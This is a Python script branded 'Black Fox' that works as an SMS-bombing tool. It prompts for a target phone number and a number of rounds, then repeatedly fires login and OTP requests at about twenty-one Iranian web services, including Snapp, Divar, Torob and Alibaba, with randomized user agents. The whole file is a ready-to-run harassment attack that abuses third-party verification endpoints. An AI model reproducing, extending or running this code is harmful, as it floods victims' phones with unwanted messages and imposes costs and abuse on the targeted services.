import orjson
from requests.api import request
import urllib3
import json
import pyuseragents
import colorama
from pyfiglet import Figlet
xos = pyuseragents.random()

mag = colorama.Fore.MAGENTA
rd = colorama.Fore.RED
gn = colorama.Fore.GREEN
cv = colorama.Fore.WHITE
bl = colorama.Fore.BLUE
def logo():
    logo = Figlet(font="standard").renderText("Black Fox")
    return (mag + logo)
print (logo())
print (bl + "[+] Made By : Maximum Radikali")

number = input(rd + "[~] PLease enter your phone number , start with[912xxxx] -> ")
xr = int(input(gn + "[•] Type round to send message ex [1] --> "))
http = urllib3. PoolManager()
header = {"content-type":"application/json","user-agent":xos}

def sheypoor():
    site = "https://www.sheypoor.com/api/v10.0.0/auth/send"
    data = orjson.dumps({"username":"0"+number})
    http.request("POST",site,body=data,headers=header)
    #---------------------------
def snapbox():
    site="https://app.snapp-box.com/api/v2/auth/otp/send"

    data = orjson.dumps({"phoneNumber":"0"+number})
    http.request("POST",site,headers=header,body=data)
def snapfood():
    site = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.794&long=53.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=53e13b13-8b47-43ed-bf93-d7343a7b8d0f&locale=en"
    http.request("POST",site,fields={"cellphone":"0"+number})
def tapsi():
    site = "https://api.tapsi.cab/api/v2/user"
    data = orjson.dumps({"credential":{"phoneNumber":"0"+number,"role":"PASSENGER"}})
    http.request("POST",site,headers=header,body=data)

def snapp():
    site = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    data = orjson.dumps({"cellphone":"+98"+number})
    http.request("POST",site,headers=header,body=data)
def divar():
    site = "https://api.divar.ir/v5/auth/authenticate"
    data = orjson.dumps({"phone":number})
    http.request("POST",site,headers=header,body=data)
def torob():
    site = "https://api.torob.com/v4/user/phone/send-pin/?phone_number=0"+number
    http.request("GET",site)
def sibche():
    site = "https://api.sibche.com/profile/sendCode"
    data = orjson.dumps({"mobile":"0"+number})
    http.request("OPTIONS",site,headers=header)
    http.request("POST",site,headers=header,body=data)
def zerinpal():
    site = "https://api.zarinplus.com/user/zarinpal-login"
    http.request("OPTIONS",site,headers=header)
    data = orjson.dumps({"phone_number":"98"+number})
    http.request("POST",site,headers=header,body=data)
def alibaba():
    site = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
    http.request("OPTIONS",site,headers=header)
    data = orjson.dumps({"phoneNumber":number})
    http.request("POST",site,headers=header,body=data)

def safarmoon():
    site = "https://api1.safaremoon.com/auth/login"
    data = orjson.dumps({"phoneNumber":"0"+number})
    http.request("POST",site,headers=header,body=data)
def gap():
    site = "https://core.gap.im/v1/user/add.json?mobile=%2B98"+number
    http.request("GET",site)
def hamrahcard():
    site = "https://hamrahcard.ir/wp-admin/admin-ajax.php"
    data = {"action":"getAppViaSMS","number":"0"+number}
    http.request("POST",site,fields=data)

def bargh():
    site = "https://uiapi.saapa.ir/api/otp/sendCode"
    data = orjson.dumps({"mobile":"0"+number})
    http.request("POST",site,body=data)
def echarge():
    site = "https://lottery.rayanertebat.ir/api/User/Otp?t=1650423280427"
    http.request("OPTIONS",site)
    data = orjson.dumps({"mobileNo":"0"+number})
    http.request("POST",site,headers=header,body=data)
def snapmarket():
    site = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0"+number
    http.request("POST",site)
def stripmarket():
    site = "https://www.snapptrip.com/register"
    data = orjson.dumps({"lang":"fa","country_id":"860","password":"asdads123","mobile_phone":"0"+number,"country_code":"+98","email":"sdasd21893128@gmail.com"})
    http.request("POST",site,headers=header,body=data)

def sahapps():
    site = "https://sahabapps.com/SahabSite_Controller/Verify_MobileNumber_Register_c/"
    data = {"mobile":"0"+number}
    http.request("POST",site,fields=data)

def okala():

    site = "https://api-react.okala.com/C/CustomerAccount/OTPRegister"
    data = orjson.dumps({"mobile":"0"+number,"deviceTypeCode":0,"confirmTerms":True,"notRobot":True})
    http.request("POST",site,body=data,headers=header)

def timch():
    site = "https://api.timcheh.com/auth/otp/send"
    http.request("OPTIONS",site,headers=header)
    data = orjson.dumps({"mobile":"0"+number})
    http.request("POST",site,headers=header,body=data)

def banimod():
    site = "https://mobapi.banimode.com/api/v2/auth/request"
    http.request("OPTIONS",site,headers=header)
    data = orjson.dumps({"phone":"0"+number})
    http.request("POST",site,headers=header,body=data)
def rojashop():
    site0 = "https://rojashop.com/api/auth/checkIsRegister"
    data = {"mobile":"0"+number}
    http.request("POST",site0,fields=data)
    site = "https://rojashop.com/api/auth/sendOtp"
    http.request("POST",site,fields=data)
for xn in range(int(xr)):
    print ("Sending message " + str(xn))
    sheypoor()
    snapbox()
    snapfood()
    snapp()
    divar()
    torob()
    sibche()
    zerinpal()
    tapsi()
    alibaba()
    safarmoon()
    gap()
    hamrahcard()
    bargh()
    echarge()
    stripmarket()
    sahapps()
    okala()
    timch()
    banimod()
    rojashop()


print ("the operation has been successfully" + cv)
